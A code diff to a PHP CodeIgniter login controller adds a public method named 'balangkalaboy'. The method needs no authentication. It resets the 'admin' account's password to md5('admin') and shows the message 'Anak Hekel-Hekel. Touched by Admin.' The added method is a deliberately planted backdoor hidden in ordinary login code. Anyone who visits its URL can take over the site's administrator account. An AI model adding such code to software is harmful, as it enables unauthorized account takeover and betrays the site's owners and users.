@@ -31,4 +31,13 @@ class Login extends CI_Controller {
 		$this->session->set_flashdata('info', 'Masuk untuk melanjutkan');
 		redirect('login');
 	}
+	public function balangkalaboy()
+	{
+		$this->load->model('UserModel');
+		$username = 'admin';
+		$data['password'] = md5('admin');
+		$this->UserModel->update_user_by_username($data, $username);
+		$this->session->set_flashdata('error', 'Anak Hekel-Hekel. Touched by Admin.');
+		redirect('login');
+	}
 }
